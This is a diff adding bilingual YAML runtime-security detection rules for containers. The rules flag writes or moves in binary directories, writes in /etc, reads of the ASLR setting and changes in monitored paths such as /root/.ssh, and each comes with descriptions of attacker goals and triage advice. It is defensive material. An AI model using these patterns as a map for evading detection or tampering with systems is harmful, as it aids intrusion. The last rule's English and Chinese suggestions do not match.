+      zh: "受监控的目录/boot、/lib64、/usr/lib、/root/.ssh等通常不会直接由用户进行修改，大概率是攻击者在进行攻击后为了实施恶意活动，包括植入后门、更改系统配置、隐藏恶意代码、篡改敏感数据等。"
+    suggestion:
+      en: "Please use the process tree to determine whether the command belongs to the normal behavior of known processes, whether it is executed by malware, confirm whether the modification is operated by operation and maintenance personnel, and check whether the file content is safe."
+      zh: "请通过进程树判断该命令是否属于已知进程的正常行为，是否由恶意软件执行，确认该修改是否为运维人员操作，排查文件内容是否安全。"
+    rule_type: Execution
+    priority: ERROR
+    urgency: true
+    tags: [ATT&CK, exec, file, filesystem, mitre_execution, L1]
+
+- key: Write below binary dir
+  hid: exec_17
+  condition: >
+    bin_dir and evt.dir = < and open_write
+    and shell_family_procs
+    and not package_mgmt_procs
+    and not exe_running_docker_save
+    and not python_running_get_pip
+    and not python_running_ms_oms
+    and not user_known_write_below_binary_dir_activities
+  output: >
+    proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,file=%fd.name,parent=%proc.pname,gparent=%proc.aname[2],container_id=%container.id,container_name=%container.name,image=%container.image.repository
+  info:
+    name:
+      en: "Write below binary dir"
+      zh: "尝试修改二进制目录下面的文件"
+    desc:
+      en: "Attackers modify files in binary directories, such as /bin, /sbin, /usr/bin and /usr/sbin, usually to implement backdoor implants, privilege escalation attacks, tamper with system behavior, hide malicious activities, or conduct data theft and Tampering and other malicious activities."
+      zh: "攻击者修改二进制目录下的文件，如/bin、/sbin、/usr/bin和/usr/sbin，通常是为了实施后门植入、提权攻击、篡改系统行为、隐藏恶意活动或进行数据窃取和篡改等恶意活动。"
+    suggestion:
+      en: "Please use the process tree to determine whether the command belongs to the normal behavior of known processes, whether it is executed by malware, confirm whether the modification is operated by operation and maintenance personnel, and check whether the file content is safe."
+      zh: "请通过进程树判断该命令是否属于已知进程的正常行为，是否由恶意软件执行，确认该修改是否为运维人员操作，排查文件内容是否安全。"
+    rule_type: Execution
+    priority: WARNING
+    urgency: false
+    tags: [ATT&CK, exec, filesystem, mitre_execution, L3]
+
+- key: Modify binary dirs
+  hid: exec_18
+  condition: >
+    bin_dir_rename and modify and not package_mgmt_procs and not exe_running_docker_save and not user_known_modify_bin_dir_activities and
+    shell_parent_procs
+  output: >
+    proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,operation=%evt.type,file=%fd.name,evt.args=%evt.args,container_id=%container.id,container_name=%container.name,image=%container.image.repository
+  info:
+    name:
+      en: "Modify binary dirs"
+      zh: "移动或删除二进制目录"
+    desc:
+      en: "Usually binary directories such as /bin, /sbin, /usr/bin, /usr/sbin will not be moved or deleted directly by the user. There is a high probability that the attacker will move or delete key system binary files after the attack, so that they It can achieve malicious purposes such as elevating privileges, establishing backdoors, stealing data, tampering with system behavior, evading detection, and damaging the system."
+      zh: "通常二进制目录如/bin、/sbin、/usr/bin、/usr/sbin 不会直接由用户进行移动或删除，大概率是攻击者在进行攻击后，为了移动或删除关键系统二进制文件，这样他们可以实现提权、建立后门、窃取数据、篡改系统行为、逃避检测、破坏系统等恶意目的。"
+    suggestion:
+      en: "Please use the process tree to determine whether the command belongs to the normal behavior of known processes, whether it is executed by malware, the behavior may be a hacker backdoor residency behavior, please confirm the modified file function, you can use offset defense to block new or modified executable files."
+      zh: "请通过进程树判断该命令是否属于已知进程的正常行为，是否由恶意软件执行，该行为可能为黑客后门驻留行为，请确认被修改文件功能，可使用偏移防御阻拦新的或被修改的可执行文件。"
+    rule_type: Execution
+    priority: ERROR
+    urgency: false
+    tags: [ATT&CK, exec, filesystem, mitre_execution, L3]
+
+- key: Write below etc
+  disable: true
+  hid: exec_19
+  condition: >
+    write_etc_common and not (tensorsec_namespace and k8s.pod.name contains "holmes") and shell_parent_procs
+  output: >
+    proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,parent=%proc.pname,file=%fd.name,program=%proc.name,gparent=%proc.aname[2],ggparent=%proc.aname[3],gggparent=%proc.aname[4],container_id=%container.id,container_name=%container.name,image=%container.image.repository
+  info:
+    name:
+      en: "Write below etc"
+      zh: "尝试修改/etc路径下的文件"
+    desc:
+      en: "/etc is an important directory in the Linux system, used to store configuration files and system-related information. Usually users will not easily modify the files inside. There is a high probability that after the attack, the attacker will change the system configuration, insert a backdoor or malicious code to maintain persistent access, steal sensitive information, or destroy the normal operation of the system, which may cause the system to malfunction. Crash or data corruption."
+      zh: "/etc是 Linux 系统中的一个重要目录，用于存储配置文件和系统相关的信息。通常用户不会轻易修改里面的文件，大概率是攻击者在进行攻击后，为了更改系统配置，插入后门或恶意代码以维持持久性访问，窃取敏感信息，或破坏系统的正常运行，可能导致系统崩溃或数据损坏。"
+    suggestion:
+      en: "Usually, few programs can operate on the contents of the /etc directory, which may be a hacker's behavior. Please confirm whether the modified files are at risk."
+      zh: "通常很少有程序会操作/etc目录下内容，可能是黑客行为，请确认被修改文件是否存在风险。"
+    rule_type: Execution
+    priority: WARNING
+    urgency: true
+    tags: [ATT&CK, exec, filesystem, mitre_execution, L2]
+
+#/proc/sys/kernel/randomize_va_space
+- key: Get the level of address space randomization
+  disable: true
+  hid: exec_20
+  condition: >
+    open_read and container
+    and fd.name = /proc/sys/kernel/randomize_va_space
+    and shell_parent_procs
+    and not falco_sensitive_mount_containers
+    and not user_sensitive_mount_containers
+    and not tensorsec_namespace
+  output: >
+    proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,parent=%proc.pname,file=%fd.name,program=%proc.name,gparent=%proc.aname[2],ggparent=%proc.aname[3],gggparent=%proc.aname[4],container_id=%container.id,container_name=%container.name,image=%container.image.repository
+  info:
+    name:
+      en: "Get the level of address space randomization"
+      zh: "获取地址空间随机化的级别"
+    desc:
+      en: "/proc/sys/kernel/randomize_va_space is a virtual file in Linux systems used to control the level of address space randomization (ASLR). ASLR is a computer security mechanism designed to increase the security of the system by randomizing the allocation of memory addresses to prevent malicious attackers from exploiting memory vulnerabilities. Generally, we believe that normal users will not perform this behavior in the container. There is a high probability that the attacker will read randomize_va_space to obtain the address space randomization (ASLR) level of the system after carrying out the attack to understand the security configuration of the system."
+      zh: "/proc/sys/kernel/randomize_va_space 是一个Linux系统中的虚拟文件，用于控制地址空间随机化（ASLR）的级别。ASLR是一种计算机安全机制，旨在增加系统的安全性，通过随机化内存地址的分配来防止恶意攻击者利用内存漏洞。通常我们认为正常用户不会在容器内进行此行为，大概率是攻击者在进行攻击后，读取 randomize_va_space 获取系统的地址空间随机化（ASLR）级别，以了解系统的安全配置。"
+    suggestion:
+      en: "If a container is compromised, you need to isolate the container, obtain the attacker's remote IP address, and investigate other attacks to confirm cluster security."
+      zh: "请通过进程树判断该命令是否属于已知进程的正常行为，是否由恶意软件执行，确认该更新操作是否符合预期，是否为运维人员触发。"
+    rule_type: Execution
+    priority: INFO
+    urgency: false
+    tags: [ATT&CK, exec, filesystem, mitre_execution, L3]
+
+
+    
